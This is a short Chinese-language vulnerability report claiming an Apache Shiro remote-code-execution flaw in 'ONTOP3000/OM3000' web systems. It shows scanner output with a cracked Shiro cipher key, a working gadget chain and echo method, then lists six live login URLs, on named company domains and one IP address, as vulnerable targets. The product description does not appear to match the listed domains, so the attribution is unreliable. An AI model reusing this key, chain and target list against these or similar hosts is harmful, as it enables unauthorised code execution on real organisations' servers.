# ONTOP3000/OM3000web系统存在shiro RCE漏洞

## web系统介绍

ONTOP3000是一个由ONTOP提供的软件，它可以帮助你在超过150个国家管理和支付你的国际团队。ONTOP是一个平台，它为全球企业提供远程招聘、即时支付和税务解决方案。

## 官网

https://www.getontop.com/

## 漏洞复现1

[++] 存在shiro框架！
[++] 含有多个shiro场景
[++] 找到key：kPH+bIxk5D2deZiIxcaaaA==
[+] 爆破结束
[++] 发现构造链:CommonsBeanutilsString_183  回显方式: AllEcho
[++] 请尝试进行功能区利用。
![image-20230531103856539](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230531103856539.png)

## 漏洞网址

https://om3000.omlog.com/OM3000V2App/login

https://as.olgworldwide.com/OM3000V2App/login

https://login.olgworldwide.cn/OM3000V2App/login

https://218.255.183.82/OM3000V2App/login

https://uk.olgworldwide.com/OM3000V2App/login

https://eu.olgworldwide.com/OM3000V2App/login